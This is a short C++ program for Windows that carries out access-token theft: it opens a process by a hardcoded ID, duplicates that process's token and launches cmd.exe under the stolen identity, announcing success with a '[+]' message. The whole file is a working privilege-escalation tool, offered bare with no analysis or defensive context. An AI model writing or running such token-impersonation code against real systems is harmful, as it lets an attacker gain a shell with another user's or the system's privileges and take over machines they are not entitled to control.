#include "stdafx.h"
#include <windows.h>
#include <iostream>

int main(int argc, char* argv[]) {
    char a;
    HANDLE processHandle;
    HANDLE tokenHandle = NULL;
    HANDLE duplicateTokenHandle = NULL;

    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInformation;
    DWORD PID_TO_IMPERSONATE = 18436; // Process ID to impersonate
    wchar_t cmdline[] = L"C:\\Windows\\System32\\cmd.exe"; // Command line to launch cmd.exe

    ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
    ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
    startupInfo.cb = sizeof(STARTUPINFO);

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID_TO_IMPERSONATE);
    if (processHandle == NULL) {
        std::cerr << "Failed to open process. Error: " << GetLastError() << std::endl;
        return 1;
    }

    if (!OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle)) {
        std::cerr << "Failed to open process token. Error: " << GetLastError() << std::endl;
        CloseHandle(processHandle);
        return 1;
    }

    if (!DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle)) {
        std::cerr << "Failed to duplicate token. Error: " << GetLastError() << std::endl;
        CloseHandle(tokenHandle);
        CloseHandle(processHandle);
        return 1;
    }

    if (!CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation)) {
        std::cerr << "Failed to create process. Error: " << GetLastError() << std::endl;
        CloseHandle(duplicateTokenHandle);
        CloseHandle(tokenHandle);
        CloseHandle(processHandle);
        return 1;
    }

    std::cout << "[+] Successfully launched cmd.exe!" << std::endl;

    std::cin >> a;

    CloseHandle(processInformation.hProcess);
    CloseHandle(processInformation.hThread);
    CloseHandle(duplicateTokenHandle);
    CloseHandle(tokenHandle);
    CloseHandle(processHandle);

    return 0;
}